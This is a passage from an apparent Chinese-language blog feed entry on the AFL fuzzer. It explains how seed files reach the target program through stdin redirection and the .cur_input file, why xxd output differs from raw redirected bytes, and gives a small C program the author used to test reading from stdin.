如果指定了out_file，则标准输入重定向到dev_null_fd，否则重定向到out_fd</span><span class="token keyword">if</span> <span class="token punctuation">(</span>out_file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">dup2</span><span class="token punctuation">(</span>dev_null_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token function">dup2</span><span class="token punctuation">(</span>out_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span>out_fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  到此，也就是接受文件名作为参数的，会把标准输入重定向为NULL。接受标准输入作为参数的，回把out_fd指向的文件内容以标准输入的形式输入到程序中。</p><hr><p>特别说明，在每一次fuzz的过程中。AFL都会调用类似于<code>write_to_testcase</code>的函数，将新的变异过的文件内容，写入<code>out_file</code>中，并清楚原来的内容。</p><p>在fuzz的过程中，用到哪个种子文件就打开哪个，然后把种子文件的内容复制到<code>.cur_input</code>文件里面, 再对 <code>.cur_input</code>文件中内容进行 位翻转等一系列变异操作，同时观察是否可以保留下来。如果能保留下来，就保留。不能保留就进行下面的变异步骤。之后循环往复。 </p><h2 id="为什么二进制文件使用xxd查看的内容-和-重定向到标准输入得到的内容不一致"><a href="#为什么二进制文件使用xxd查看的内容-和-重定向到标准输入得到的内容不一致" class="headerlink" title="为什么二进制文件使用xxd查看的内容 和 重定向到标准输入得到的内容不一致"></a>为什么二进制文件使用xxd查看的内容 和 重定向到标准输入得到的内容不一致</h2><p><code>xxd</code>看到的是ASCII码，ASCII码一共就只有128个，也就是从<code>0x 00 - 0x 7F</code>。超过这个范围的编码，在xxd命令里面一律显示为<code>.</code>。 除此之外，还有一些控制码，比如退格(Backspace)、回车(Enter)等等，同样也会被显示为<code>.</code>。</p><p>所以你使用xxd看到的内容和重定向到标准输入得到的内容肯定是不一致的。 那你把看到的内容复制出来，然后再送给程序后，显示的结果 肯定 和重定向送入程序显示的结果 不一致。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220422102811.png" alt="xxd"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220422103118.png" alt="ASCII"></p><h2 id="那重定向是输入的什么呢？以什么方式输入的呢？"><a href="#那重定向是输入的什么呢？以什么方式输入的呢？" class="headerlink" title="那重定向是输入的什么呢？以什么方式输入的呢？"></a>那重定向是输入的什么呢？以什么方式输入的呢？</h2><p>一般来说接受标准输入的程序，会使用getchar()来获取标准输入的内容。</p><p>我就用做了一个测试, 发现显示不了的就是按二进制输入的估计。反正到程序里面之后都是以二进制的方式在判断。他只是没有对应的字符显示罢了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220422105756.png" alt="测试"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">static</span> <span class="token keyword">char</span> mbuffer<span class="token punctuation">[</span><span class="token number">32767</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> c<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>mbuffer<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token function">getchar</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>mbuffer<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token function">getchar</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>mbuffer<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>mbuffer<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AFL种子文件是如何送入目标程序的？&quot;&gt;&lt;a href=&quot;#AFL种子文件是如何送入目标程序的？&quot; class=&quot;headerlink&quot; title=&quot;AFL种子文件是如何送入目标程序的？&quot;&gt;&lt;/a&gt;AFL种子文件是如何送入目标程序的？&lt;/h1&gt;&lt;p&gt;在做实验的过</summary>
      
    
    
    
    <category term="毕设" scheme="https://laobameishijia.github.io/category/%E6%AF%95%E8%AE%BE/"/>
    
    
    <category term="Fuzz" scheme="https://laobameishijia.github.io/tag/Fuzz/"/>
    
    <category term="AFLGo" scheme="https://laobameishijia.github.io/tag/AFLGo/"/>
    
  </entry>
  
</feed>
